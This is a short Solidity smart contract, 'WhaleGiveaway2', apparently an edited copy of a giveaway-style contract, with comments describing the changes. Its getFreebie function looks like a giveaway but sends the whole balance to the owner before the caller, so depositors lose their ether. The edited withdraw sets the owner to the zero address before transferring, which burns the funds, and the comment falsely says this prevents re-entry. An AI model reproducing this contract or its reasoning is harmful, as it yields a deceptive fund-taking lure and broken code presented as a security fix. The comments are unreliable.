pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public owner = msg.sender;

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner = 0x0;
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);

        require(adr.call.value(msg.value)(data));
    }
} 

// Changes Made:
// 1. Changed Owner to owner for consistency
// 2. Added owner = 0x0; to withdraw function to prevent re-entry attacks
// 3. Added require(adr.call.value(msg.value)(data)); to command function to check for return value of external call